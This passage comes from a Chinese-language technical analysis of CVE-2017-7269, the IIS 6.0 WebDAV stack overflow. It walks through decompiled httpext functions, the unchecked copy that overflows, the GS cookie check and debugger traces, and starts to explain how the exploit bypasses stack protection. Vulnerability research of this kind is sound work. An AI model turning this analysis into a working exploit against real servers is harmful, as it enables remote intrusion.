  <span class="n">result</span> <span class="o">=</span> <span class="n">ScStripAndCheckHttpPrefix</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Str</span><span class="p">);</span><span class="c1">//主要用来检查开头信息，比如http头以及host等等</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">Str</span> <span class="o">!=</span> <span class="mi">47</span> <span class="p">)</span><span class="c1">//判断第一个值是不是/</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">2146107135</span><span class="p">;</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">_wcslen</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span><span class="c1">//获取str长度，也就是畸形url长度</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">IEcbBase</span><span class="o">::</span><span class="n">ScReqMapUrlToPathEx</span><span class="p">(</span><span class="n">Str</span><span class="p">,</span> <span class="n">WideCharStr</span><span class="p">);</span>
  <span class="n">v36</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
  <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="n">__thiscall</span> <span class="o">**</span><span class="p">)(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">IEcb</span> <span class="o">*</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">**</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">52</span><span class="p">))(</span><span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Str1</span><span class="p">);</span><span class="c1">//httpext!CEcbBaseImpl&lt;IEcb&gt;::CchGetVirtualRootW (6712d665) 获取虚拟路径</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">==</span> <span class="n">v42</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v8</span> <span class="o">||</span> <span class="n">Str</span><span class="p">[</span><span class="n">v8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">__wcsnicmp</span><span class="p">(</span><span class="n">Str1</span><span class="p">,</span> <span class="n">Str</span><span class="p">,</span> <span class="n">v8</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_14</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">v42</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v9</span> <span class="o">=</span> <span class="n">Str</span><span class="p">[</span><span class="n">v8</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v9</span> <span class="o">==</span> <span class="mi">47</span> <span class="o">||</span> <span class="o">!</span><span class="n">v9</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="o">--</span><span class="n">v42</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LABEL_14</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">v36</span> <span class="o">=</span> <span class="mi">1378295</span><span class="p">;</span>
<span class="nl">LABEL_14</span><span class="p">:</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v36</span> <span class="o">==</span> <span class="mi">1378295</span> <span class="o">&amp;&amp;</span> <span class="n">a5</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="err">……</span>
  <span class="p">}</span>
  <span class="n">v16</span> <span class="o">=</span> <span class="n">v41</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v41</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v17</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v39</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v41</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v17</span> <span class="o">==</span> <span class="mi">92</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v16</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">v17</span> <span class="o">==</span> <span class="mi">92</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">FIsDriveTrailingChar</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="n">v16</span><span class="p">)</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v41</span> <span class="o">=</span> <span class="o">--</span><span class="n">v16</span><span class="p">;</span>
        <span class="o">--</span><span class="n">v17</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">v17</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v16</span> <span class="o">=</span> <span class="n">v41</span><span class="o">--</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">v18</span> <span class="o">=</span> <span class="n">v16</span> <span class="o">-</span> <span class="n">v42</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v19</span> <span class="o">=</span> <span class="o">*</span><span class="n">v34</span> <span class="o">&lt;</span> <span class="n">v18</span><span class="p">;</span>
  <span class="n">v37</span> <span class="o">=</span> <span class="n">v16</span> <span class="o">-</span> <span class="n">v42</span> <span class="o">+</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v19</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="err">……</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="c1">//进入这一处else处理</span>
  <span class="p">{</span>
    <span class="n">v21</span> <span class="o">=</span> <span class="n">v35</span><span class="p">;</span>
    <span class="n">v22</span> <span class="o">=</span> <span class="n">v16</span><span class="p">;</span>
    <span class="n">v23</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v16</span><span class="p">;</span>
    <span class="n">v24</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v16</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v35</span><span class="p">,</span> <span class="n">WideCharStr</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v24</span><span class="p">);</span><span class="c1">//拷贝虚拟路径</span>
    <span class="n">v26</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">WideCharStr</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v24</span><span class="p">];</span>
    <span class="n">v25</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v24</span><span class="p">];</span>
    <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v24</span><span class="p">)</span> <span class="o">=</span> <span class="n">v23</span><span class="p">;</span>
    <span class="n">v27</span> <span class="o">=</span> <span class="n">v42</span><span class="p">;</span>
    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v25</span><span class="p">,</span> <span class="n">v26</span><span class="p">,</span> <span class="n">v24</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">);</span>
    <span class="n">v28</span> <span class="o">=</span> <span class="n">v7</span> <span class="o">-</span> <span class="n">v27</span><span class="p">;</span><span class="c1">//这里v7是0x2fd，相减赋值给v28，这个值很大，v27为0</span>
    <span class="n">v29</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Str</span><span class="p">[</span><span class="n">v27</span><span class="p">];</span>
    <span class="n">v30</span> <span class="o">=</span> <span class="n">v35</span><span class="p">;</span>
    <span class="n">qmemcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v35</span><span class="p">[</span><span class="n">v22</span><span class="p">],</span> <span class="n">v29</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v28</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span><span class="c1">//直接拷贝到栈中，没有对长度进行检查，导致溢出</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v30</span><span class="p">[</span><span class="n">v41</span><span class="p">];</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">i</span> <span class="o">==</span> <span class="mi">47</span> <span class="p">)</span>
        <span class="o">*</span><span class="n">i</span> <span class="o">=</span> <span class="mi">92</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">*</span><span class="n">v34</span> <span class="o">=</span> <span class="n">v37</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">v36</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<hr />
<h3>CVE-2017-7269 Exploit!精妙的漏洞利用</h3>
<hr />
<p>其实通过上面的分析，我们发现这个漏洞的 原理非常简单，但是究竟如何利用呢，我们来看一下关于ScStorageFromUrl函数中，包含了GS check，也就是说，我们在进行常规的覆盖ret方式利用的情况下，将会把cookie也会覆盖，导致利用失败。</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">67127017</span> <span class="nl">loc_67127017:</span>                           <span class="c">; CODE XREF: ScStoragePathFromUrl(IEcb const &amp;,ushort const *,ushort *,uint *,CVRoot * *)+50j</span>
<span class="nl">.text:</span><span class="err">67127017</span>                                         <span class="c">; ScStoragePathFromUrl(IEcb const &amp;,ushort const *,ushort *,uint *,CVRoot * *)+67j</span>
<span class="nl">.text:</span><span class="err">67127017</span>                 <span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">var_C</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">6712701</span><span class="nf">A</span>                 <span class="no">pop</span>     <span class="no">edi</span>
<span class="nl">.text:</span><span class="err">6712701</span><span class="nf">B</span>                 <span class="no">mov</span>     <span class="no">large</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="no">ecx</span>
<span class="nl">.text:</span><span class="err">67127022</span>                 <span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">var_10</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">67127025</span>                 <span class="nf">pop</span>     <span class="no">esi</span>
<span class="nl">.text:</span><span class="err">67127026</span>                 <span class="nf">call</span>    <span class="err">@</span><span class="no">__security_check_cookie@4</span> <span class="c">; __security_check_cookie(x)</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">6712702</span><span class="no">B</span>                 <span class="no">leave</span>
<span class="nl">.text:</span><span class="err">6712702</span><span class="nf">C</span>                 <span class="no">retn</span>    <span class="mi">0</span><span class="no">Ch</span>
</pre></div>


<p>漏洞利用非常精妙，也就是用这种方法，巧妙的绕过了gs的检查，最后达到漏洞利用，稳定的代码执行，首先，WebDav对数据包的处理逻辑是在DAVxxx函数中完成的。比如当前数据包是PROPFIND，那么当前的函数处理逻辑就是DAVpropfind函数。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">kb</span>
<span class="n">ChildEBP</span> <span class="n">RetAddr</span>  <span class="n">Args</span> <span class="n">to</span> <span class="n">Child</span>              
<span class="mi">00</span><span class="n">fff798</span> <span class="mi">67119469</span> <span class="mi">680312</span><span class="n">c0</span> <span class="mi">00</span><span class="n">fff800</span> <span class="mi">00000000</span> <span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span>
<span class="mi">00</span><span class="n">fff7ac</span> <span class="mi">6712544</span><span class="n">a</span> <span class="mi">0060</span><span class="n">e7b0</span> <span class="mi">680312</span><span class="n">c0</span> <span class="mi">00</span><span class="n">fff800</span> <span class="n">httpext</span><span class="o">!</span><span class="n">CMethUtil</span><span class="o">::</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x18</span>
<span class="mi">00</span><span class="n">fffc34</span> <span class="mi">6712561</span><span class="n">e</span> <span class="mi">0060</span><span class="n">b508</span> <span class="mi">0060584</span><span class="n">e</span> <span class="mi">00</span><span class="n">fffc78</span> <span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x124</span>
<span class="mi">00</span><span class="n">fffc44</span> <span class="mi">6711</span><span class="n">f659</span> <span class="mi">0060</span><span class="n">b508</span> <span class="mi">0060584</span><span class="n">e</span> <span class="mi">00000001</span> <span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckStateHeaders</span><span class="o">+</span><span class="mh">0x10</span>
<span class="mi">00</span><span class="n">fffc78</span> <span class="mi">6711</span><span class="n">f7c5</span> <span class="mi">0060</span><span class="n">c010</span> <span class="mi">00</span><span class="n">fffcd4</span> <span class="mi">671404</span><span class="n">e2</span> <span class="n">httpext</span><span class="o">!</span><span class="n">CPropFindRequest</span><span class="o">::</span><span class="n">Execute</span><span class="o">+</span><span class="mh">0xf0</span>
<span class="mi">00</span><span class="n">fffc90</span> <span class="mi">671296</span><span class="n">f2</span> <span class="mi">0060</span><span class="n">c010</span> <span class="mi">00000004</span> <span class="mi">01017</span><span class="n">af8</span> <span class="n">httpext</span><span class="o">!</span><span class="n">DAVPropFind</span><span class="o">+</span><span class="mh">0x47</span>
</pre></div>


<p>在内层的函数处理逻辑中，有一处关键的函数处理逻辑HrCheckIfHeader，主要负责DAVPropFind函数对头部的check，这个函数处理逻辑中有一处while循环，我已经把这个循环的关键位置的注释写在伪代码中。</p>
<div class="codehilite"><pre><span></span><span class="kr">__int32</span> <span class="kr">__stdcall</span> <span class="nf">HrCheckIfHeader</span><span class="p">(</span><span class="k">struct</span> <span class="n">CMethUtil</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
 <span class="k">while</span> <span class="p">(</span> <span class="mi">2</span> <span class="p">)</span>
  <span class="p">{</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">IFITER</span><span class="o">::</span><span class="n">PszNextToken</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v20</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span><span class="err">／／这里获取下一个</span><span class="n">url值</span><span class="err">，第一轮会进入这里，第二轮也会，第三轮就进不去了</span>
    <span class="p">{</span>
      <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;::</span><span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">260</span><span class="p">);</span>
      <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
      <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v34</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
      <span class="n">v27</span> <span class="o">=</span> <span class="n">_wcslen</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;::</span><span class="n">resize</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v27</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_35</span><span class="p">;</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="n">ScCanonicalizePrefixedURL</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">v32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v27</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_43</span><span class="p">;</span>
      <span class="n">v27</span> <span class="o">=</span> <span class="n">v29</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">;</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="n">CMethUtil</span><span class="o">::</span><span class="n">ScStoragePathFromUrl</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">v32</span><span class="p">,</span> <span class="n">Str</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v27</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;::</span><span class="n">resize</span><span class="p">(</span><span class="n">v27</span><span class="p">)</span> <span class="p">)</span>
        <span class="p">{</span>
<span class="nl">LABEL_35</span><span class="p">:</span>
          <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v34</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;::</span><span class="n">release</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v31</span><span class="p">);</span>
          <span class="n">v5</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147024882</span><span class="p">;</span>
          <span class="k">goto</span> <span class="n">LABEL_39</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">CMethUtil</span><span class="o">::</span><span class="n">ScStoragePathFromUrl</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">v32</span><span class="p">,</span> <span class="n">Str</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v27</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="p">{</span>
<span class="nl">LABEL_43</span><span class="p">:</span>
        <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v34</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;::</span><span class="n">release</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v31</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">LABEL_39</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">v10</span> <span class="o">=</span> <span class="n">_wcslen</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>
      <span class="n">v27</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
      <span class="n">v11</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Str</span><span class="p">[</span><span class="n">v10</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v11</span> <span class="o">==</span> <span class="mi">62</span> <span class="p">)</span>
        <span class="o">*</span><span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">v8</span> <span class="o">=</span> <span class="n">Str</span><span class="p">;</span>
      <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v34</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">CStackBuffer</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="mi">260</span><span class="o">&gt;::</span><span class="n">release</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v31</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v25</span> <span class="p">)</span><span class="err">／／进不去就跳入这里，直接</span><span class="n">break掉</span><span class="err">，随后进入</span><span class="n">locktoken</span><span class="err">，会调用</span><span class="n">sc函数</span>
        <span class="k">goto</span> <span class="n">LABEL_38</span><span class="p">;</span>
      <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">v24</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">v25</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">IFITER</span><span class="o">::</span><span class="n">PszNextToken</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v20</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">IFITER</span><span class="o">::</span><span class="n">PszNextToken</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v20</span><span class="p">,</span> <span class="n">v19</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v17</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">i</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">v12</span> <span class="o">=</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v17</span> <span class="o">==</span> <span class="mi">60</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v13</span> <span class="o">=</span> <span class="n">HrValidTokenExpression</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="n">v17</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">==</span> <span class="mi">91</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">FGetLastModTime</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_FILETIME</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v23</span><span class="p">)</span>
          <span class="o">||</span> <span class="o">!</span><span class="n">FETagFromFiletime</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v23</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">String</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="p">)</span>
        <span class="p">{</span>
<span class="nl">LABEL_26</span><span class="p">:</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v22</span> <span class="p">)</span>
            <span class="k">goto</span> <span class="n">LABEL_27</span><span class="p">;</span>
          <span class="k">goto</span> <span class="n">LABEL_30</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">v14</span> <span class="o">=</span> <span class="n">v17</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v14</span> <span class="o">==</span> <span class="mi">87</span> <span class="p">)</span>
          <span class="n">v14</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="n">v15</span> <span class="o">=</span> <span class="n">_wcslen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">String</span><span class="p">);</span>
        <span class="n">v13</span> <span class="o">=</span> <span class="n">_wcsncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">String</span><span class="p">,</span> <span class="n">v14</span><span class="p">,</span> <span class="n">v15</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">v13</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147467259</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v13</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_26</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v22</span> <span class="p">)</span><span class="err">／／如果不等于</span><span class="mi">22</span><span class="err">，则</span><span class="n">v26为1</span> <span class="k">continue</span><span class="err">，这里</span><span class="n">v22为0</span>
      <span class="p">{</span>
<span class="nl">LABEL_27</span><span class="p">:</span>
        <span class="n">v26</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">v19</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>
<span class="nl">LABEL_30</span><span class="p">:</span>
      <span class="n">v26</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">v19</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v26</span> <span class="p">)</span><span class="err">／／这里进这里</span>
    <span class="p">{</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">IFITER</span><span class="o">::</span><span class="n">PszNextToken</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v20</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span><span class="err">／／获得下一个</span><span class="n">url部分</span><span class="err">，第一次处理完，由于后面还有</span><span class="n">url</span><span class="err">，所以这里</span><span class="n">v6会有值</span><span class="err">，而第二次，这里后面没有值了</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
</pre></div>


<p>如果看的比较迷糊，可以看我下面的描述，首先这个while函数中，有一个非常有意思的函数PszNextToken，这个函数会连续获取&lt;&gt;中的http url，直到后面没有http url，则跳出循环，这也是这个漏洞利用的关键条件。</p>
<p>首先，第一次会处理IF后面的第一个http url，这个url就是http://localhost/aaaa ..，这个处理过程，实际上就完成了第一次溢出，首先stackbuffer会通过CStackBuffer函数获取，获取到之后，这个值会存放在stack中的一个位置。接下来会进行第一次ScStorageFromUrl，这个地方会对第一个&lt;&gt;中的http url处理。长度是0xa7。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff910</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000410</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">c64a</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671253</span><span class="n">e2</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
